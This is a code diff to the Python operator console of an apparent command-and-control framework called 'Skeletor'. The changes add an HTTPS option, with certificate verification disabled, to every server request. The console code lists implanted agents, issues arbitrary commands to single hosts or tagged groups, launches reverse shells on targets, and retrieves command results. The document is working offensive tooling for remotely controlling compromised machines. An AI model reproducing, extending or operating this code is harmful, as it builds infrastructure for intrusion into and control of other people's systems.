@@ -19,6 +19,7 @@ CUSTOM_HEADERS = {}
 if SKELETOR_AUTH_KEY.strip() != "":
     CUSTOM_HEADERS["X-Skeletor-Auth"] = SKELETOR_AUTH_KEY
 CURRENT_TARGETS=[]
+USE_HTTPS = os.getenv("USE_HTTPS", "False").lower() in ["true", "1", "yes"]
 
 def init():
     print("Initializing Skeletor Console..."+"\n"*3)
@@ -53,8 +54,10 @@ def cmd_exit():
 
 def cmd_agents():
     try:
-        agents = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents",
-        timeout=5,headers=CUSTOM_HEADERS).json()
+        if USE_HTTPS:
+            agents = requests.get(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents",timeout=5, headers=CUSTOM_HEADERS,verify=False).json()
+        else:
+            agents = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents",timeout=5, headers=CUSTOM_HEADERS).json()
         output_header = f"\n{'AGENT ID':<16} {'STATUS':<12} {'CALLBACKS':<12} {'LAST SEEN':<22} {'TAGS'}"
         print(output_header)
         print("-" * len(output_header))
@@ -81,7 +84,10 @@ def cmd_issuecmd():
     command = input("Command to execute: ").strip()
     try:
         data = {'agent_id': agent_id, 'action': 'command', 'input': command}
-        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
+        if USE_HTTPS:
+            requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data, headers=CUSTOM_HEADERS,verify=False)
+        else:
+            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data, headers=CUSTOM_HEADERS)
         print(f"Task created for {agent_id}\n")
     except Exception as e:
         print(f"\n{e}\n")
@@ -109,7 +115,10 @@ def cmd_multiexec():
                     pass
                     tag = input("Tag to target: ").strip()
                     tag_data = {"tag": tag}
-                    resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged", json=tag_data,headers=CUSTOM_HEADERS).json()
+                    if USE_HTTPS:
+                        resp = requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/tagged",verify=False, json=tag_data, headers=CUSTOM_HEADERS).json()
+                    else:
+                        resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged", json=tag_data, headers=CUSTOM_HEADERS).json()
                     tagged_agents = resp['agents']
                     for agent in tagged_agents:
                         if agent not in CURRENT_TARGETS:
@@ -127,7 +136,10 @@ def cmd_multiexec():
                     print()
                     for agent_id in CURRENT_TARGETS:
                         data = {'agent_id': agent_id, 'action': 'command', 'input': command}
-                        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
+                        if USE_HTTPS:
+                            requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/make-task",verify=False, json=data, headers=CUSTOM_HEADERS)
+                        else:
+                            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data, headers=CUSTOM_HEADERS)
                         print(f"Task created for {agent_id}")
                     print("\n")
                 case ["7"] | ["exit"] | ["quit"] | ["q"]:
@@ -144,7 +156,10 @@ def cmd_shell():
     target = input("Agent ID to launch shell on: ").strip()
     try:
         data = {'agent_id': target, 'action': 'shell', 'input': SKELETOR_SHELL_HANDLER_ADDR}
-        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
+        if USE_HTTPS:
+            requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/make-task",verify=False, json=data, headers=CUSTOM_HEADERS)
+        else:
+            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data, headers=CUSTOM_HEADERS)
         print(f"Shell task created for {target}, check the shell handler\n")
     except Exception as e:
             print(f"\n{e}\n")
@@ -159,7 +174,10 @@ def cmd_result():
             if agentid in ["exit","back","q","quit"]:
                 break
             data = {"agent_id": agentid}
-            result = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-result", json=data,headers=CUSTOM_HEADERS).json()
+            if USE_HTTPS:
+                result = requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/get-result",verify=False, json=data, headers=CUSTOM_HEADERS).json()
+            else:
+                result = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-result", json=data, headers=CUSTOM_HEADERS).json()
             print("\n" + "Agent: " + agentid + "\n" + "Command: " + result.get('command') + "\n" + "Result: " + result.get('result') + "\n")
         except KeyboardInterrupt:
             break
@@ -171,7 +189,10 @@ def cmd_agentinfo():
         agentid = input("\nAgent ID: ").strip()
         print("\nAgent ID:",agentid)
         data = {"agent_id":agentid}
-        agent_info = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agent",json=data,headers=CUSTOM_HEADERS).json()
+        if USE_HTTPS:
+            agent_info = requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/get-agent",json=data,headers=CUSTOM_HEADERS,verify=False).json()
+        else:
+            agent_info = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agent",json=data,headers=CUSTOM_HEADERS).json()
         print("Status:",agent_info["status"])
         print("Callbacks:",agent_info["callbacks"])
         print("Last Seen:",agent_info["last_seen"])
@@ -187,7 +208,10 @@ def cmd_addtag():
         agentid = input("Agent ID: ").strip()
         newtags = input("Tags to add (csv format): ").strip()
         data = {"agent_id": agentid,"tags": newtags}
-        response = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tag-agent", json=data,headers=CUSTOM_HEADERS).json()
+        if USE_HTTPS:
+            response = requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/tag-agent", json=data, headers=CUSTOM_HEADERS,verify=False).json()
+        else:
+            response = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tag-agent", json=data, headers=CUSTOM_HEADERS).json()
         print(f"\nAdded tags for {agentid}: {', '.join(response['added_tags']) if response['added_tags'] else 'None'}")
         print(f"All tags for {agentid}: {', '.join(response['all_tags'])}\n")
     except KeyboardInterrupt:
@@ -200,7 +224,10 @@ def cmd_removetag():
         agentid = input("Agent ID: ").strip()
         badtags = input("Tags to remove (csv format): ").strip()
         data = {"agent_id": agentid,"tags": badtags}
-        response = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/remove-tag", json=data,headers=CUSTOM_HEADERS).json()
+        if USE_HTTPS:
+            response = requests.post(f"https://{SKELETOR_IP}:{SKELETOR_PORT}/remove-tag", json=data, headers=CUSTOM_HEADERS).json()
+        else:
+            response = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/remove-tag", json=data, headers=CUSTOM_HEADERS).json()
         print(f"\nRemoved tags for {agentid}: {', '.join(response['removed_tags']) if response['removed_tags'] else 'None'}")
         print(f"All tags for {agentid}: {', '.join(response['all_tags'])}\n")
     except KeyboardInterrupt:
